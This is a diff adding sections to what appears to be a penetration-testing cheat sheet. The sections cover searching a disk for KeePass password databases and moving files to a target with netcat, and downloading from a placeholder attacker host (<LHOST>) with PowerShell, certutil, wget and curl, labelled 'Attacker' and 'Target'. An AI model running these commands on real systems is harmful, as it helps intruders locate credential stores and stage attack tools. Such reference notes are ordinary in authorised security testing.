@@ -360,13 +360,52 @@
 ## Discovering KDBX files
 <details>
 <summary>1. Windows</summary>
+    
 ```powershell
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 ```
 </details>
 <details>
 <summary>2. Linux</summary>
+    
 ```bash
 find / -name *.kdbx 2>/dev/null
 ```
+</details>
+
+## File Transfers
+<details>
+<summary>Netcat</summary>
+
+```bash
+#Attacker
+nc <target_ip> 1234 < nmap
+
+#Target
+nc -lvp 1234 > nmap
+```
+</details>
+
+<details>
+<summary>Downloading With Terminal</summary></br>
+Windows
+
+```powershell
+powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
+iwr -uri http://lhost/file -Outfile file
+certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
+copy \\kali\share\file .
+```
+
+Linux
+
+```bash
+wget http://lhost/file
+curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
+```
+</details>
+
+<details>
+<summary>SCP</summary></br>
+
 </details>
